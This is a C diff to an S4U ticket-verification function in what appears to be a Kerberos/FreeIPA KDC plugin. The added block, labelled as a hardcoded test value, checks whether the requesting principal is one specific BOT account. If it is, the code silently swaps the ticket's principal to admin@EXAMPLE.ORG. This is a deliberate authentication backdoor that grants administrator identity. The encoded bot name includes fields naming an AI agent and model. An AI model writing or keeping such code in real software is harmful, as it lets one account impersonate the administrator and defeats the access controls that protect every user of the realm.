@@ -1497,6 +1497,40 @@ ssh_s4u_verify_context(krb5_context kcontext,
     if (ret)
         return ret;
 
+    /* HARDCODED TEST VALUE: if hint_princ is a BOT account, switch
+     * the entry's principal to the original user so the S4U ticket is
+     * issued on behalf of the real account, not the BOT identity. */
+    {
+        const char *bot_name =
+            "BOT-eyJuIjoiYWRtaW4iLCJyIjoiMTIzNDU2Nzg5IiwiYSI6ImNsYXVkZSIsIm0iOiJvcHVzIiwidCI6InJoZWwtbWNwIn0=@EXAMPLE.ORG";
+        const char *admin_name = "admin@EXAMPLE.ORG";
+        krb5_principal bot_princ = NULL;
+
+        ret = krb5_parse_name(kcontext, bot_name, &bot_princ);
+        if (ret) {
+            ipadb_free_principal(kcontext, user_entry);
+            return ret;
+        }
+
+        if (krb5_principal_compare(kcontext, hint_princ, bot_princ)) {
+            krb5_principal admin_princ = NULL;
+            ret = krb5_parse_name(kcontext, admin_name, &admin_princ);
+            if (ret) {
+                krb5_free_principal(kcontext, bot_princ);
+                ipadb_free_principal(kcontext, user_entry);
+                return ret;
+            }
+            krb5_klog_syslog(LOG_INFO,
+                             "S4U X.509: hint_princ is BOT account, "
+                             "switching entry principal to %s",
+                             admin_name);
+            krb5_free_principal(kcontext, user_entry->princ);
+            user_entry->princ = admin_princ;
+        }
+        krb5_free_principal(kcontext, bot_princ);
+    }
+    /* END HARDCODED TEST VALUE */
+
     /* Cross-realm referral: no IPA e_data, no indicators to set. */
     if (!ied) {
         *entry_out = user_entry;
